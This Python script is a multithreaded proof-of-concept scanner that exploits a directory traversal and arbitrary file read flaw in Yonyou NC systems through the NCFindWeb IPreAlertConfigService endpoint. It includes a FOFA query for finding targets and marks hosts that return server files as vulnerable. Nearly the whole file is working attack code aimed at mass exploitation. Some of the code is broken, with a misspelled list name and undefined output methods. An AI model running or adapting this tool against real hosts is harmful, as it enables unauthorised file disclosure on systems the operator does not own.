"""
encoding: utf-8
@author: Mr.An
@file: yonyouEDP_NC_RAF_POC.py
@time: 2022/1/12 18:35
"""
import time
import requests
import os
from argparse import ArgumentParser
from threading import Lock
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings()


class POC:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.init()
        self.urlList = self.loadUrl()
        self.multiRun()
        self.start = time.time()

    def banner(self):
        logo = r"""
__     ____     ________ _____  _____  _____                _                      ______ _ _      
\ \   / /\ \   / /  ____|  __ \|  __ \|  __ \              | |   /\               |  ____(_) | PoC    
 \ \_/ /  \ \_/ /| |__  | |  | | |__) | |__) |___  __ _  __| |  /  \   _ __  _   _| |__   _| | ___ 
  \   /    \   / |  __| | |  | |  _  /|  _  // _ \/ _` |/ _` | / /\ \ | '_ \| | | |  __| | | |/ _ \
   | |      | |  | |____| |__| | | \ \| | \ \  __/ (_| | (_| |/ ____ \| | | | |_| | |    | | |  __/    
   |_|      |_|  |______|_____/|_|  \_\_|  \_\___|\__,_|\__,_/_/    \_\_| |_|\__, |_|    |_|_|\___|    
                                                                              __/ |                
                                                                             |___/         Author:Mr.An        """

        msg = """
=================================================================
| 漏洞名称 | 用友NC-EDR系统存在目录遍历&任意文件读取
| 漏洞时间 | =========
| 影响版本 | NC-EDR
| 漏洞文件 | ？？
| 默认路径 | /NCFindWeb?service=IPreAlertConfigService&filename=
| FOFA语句 | app="用友-UFIDA-NC"
=================================================================
                """
        print("\033[1;31m" + logo + "\033[0m")
        print(msg)

    def init(self):
        print("\nthread:", self.args.thread)
        print("timeout", self.args.timeout)
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url File Successfully!\n"
        else:
            msg += "Load url File failed！\n"
        print(msg)
        if "failed" in msg:
            print("Init failed , Please check the environment")
            os._exit(0)
        print("Init Successfully!\n")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d, %H:%M:%S")
        parser = ArgumentParser()
        parser.add_argument("-f", "--file", required=False, type=str, default=f"./url.txt",
                            help=f"The url file, default is ./url.txt")
        parser.add_argument("-t", "--thread", required=False, type=int, default=32,
                            help=f"Number of thread, default is 32")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=3, help="request timeout(default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=date,
                            help=f"Vuln url output file, default is {date}.txt")
        return parser.parse_args()

    # 加载url
    def loadUrl(self):
        urlList = []
        with open(self.args.file, encoding="utf-8") as fp:
            for line in fp.readlines():
                line = line.strip()
                if "https://" in line:
                    line = line.replace("https://", "http://")
                if "http://" not in line:
                    line = "http://" + line
                urlList.append(line)
        return urlList

    def verify(self, url):
        rspData = self.readFile(url, "./")
        if "WEB-INF" in rspData:
            msg = f"\033[1;32m[+] [ Vuln ] {url}\033[0m"
            self.lock.acquire()
            try:
                self.findCount += 1
                self.VulnURLList.append(url)
            finally:
                self.lock.release()
        elif "Conn" in rspData:
            msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
        else:
            rspData = self.readFile(url, "./login.jsp")
            if r'<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>' in rspData:
                msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
                self.lock.acquire()
                try:
                    self.findCount += 1
                    self.vulnRULList.append(url)
                finally:
                    self.lock.release()
            elif "Conn" == rspData:
                msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
            else:
                msg = f"[-] [ Safe ]  {url}"
        self.lock.acquire()
        try:
            print(msg)
        finally:
            self.lock.release()

    def readFile(self, url, filename):
        data = "/NCFindWeb?service=IPreAlertConfigService&filename=" + filename
        url = url + data
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            rspData = requests.get(url=url, headers=headers, timeout=self.args.timeout).content.decode("utf-8")
            return rspData
        except:
            return "Conn"

    # 多线程
    def multiRun(self):
        self.findCount = 0
        self.VulnURLList = []
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        executor.map(self.verify, self.urlList)

    def __del__(self):
        try:
            print(
                "\nattemptCount：\033[31m%d\033[0m   findCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
        except:
            pass


if __name__ == '__main__':
    POC()
